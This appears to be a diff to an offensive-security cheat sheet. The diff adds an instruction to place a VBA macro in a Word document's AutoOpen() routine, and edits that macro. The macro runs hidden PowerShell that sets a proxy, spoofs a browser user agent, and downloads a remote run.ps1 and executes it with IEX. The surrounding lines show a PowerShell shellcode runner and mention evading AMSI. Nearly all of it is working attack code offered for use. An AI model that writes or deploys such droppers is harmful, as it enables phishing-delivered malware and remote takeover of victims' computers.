@@ -78,7 +78,7 @@ $thandle=[Kernel32]::CreateThread(0,0,$addr,0,0,0);
 [Kernel32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
 ```
 
-Using this will detect proxy and with user agent, but might fail if the proxy server got AMSI? **(with proxy aware and user agent)**:
+Using this will detect proxy and with user agent, but might fail if the proxy server got AMSI? Add this to a Microsoft Word Macro `AutoOpen()` **(with proxy aware and user agent)**:
 
 ```vb
 Sub MyMacro()
@@ -91,7 +91,7 @@ Sub MyMacro()
     str = str & "[System.Net.WebRequest]::DefaultWebProxy = New-Object System.Net.WebProxy('http://$proxyAddr'); "
     str = str & "$wc = new-object system.net.WebClient; "
     str = str & "$wc.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36');"
-    str = str & "$wc.DownloadString('http://192.168.45.169/run.ps1') | IEX"""
+    str = str & "$wc.DownloadString('http://IP/run.ps1') | IEX"""
     Shell str, vbHide
 End Sub
 
